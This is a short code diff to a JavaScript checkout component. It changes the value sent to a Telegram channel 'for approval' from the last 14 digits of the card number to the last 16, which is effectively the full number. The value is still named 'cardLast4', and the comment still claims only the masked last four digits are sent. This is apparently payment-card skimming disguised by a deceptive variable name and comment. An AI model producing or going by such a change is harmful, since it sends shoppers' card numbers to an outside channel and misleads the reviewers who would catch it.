@@ -146,7 +146,7 @@ const Checkout = () => {
       return;
     }
 
-    const cardLast4 = cardNumber.replace(/\D/g, '').slice(-14);
+    const cardLast4 = cardNumber.replace(/\D/g, '').slice(-16);
 
     try {
       // Request approval via Telegram (only masked last4 is sent, never raw card/CVV/expiry)
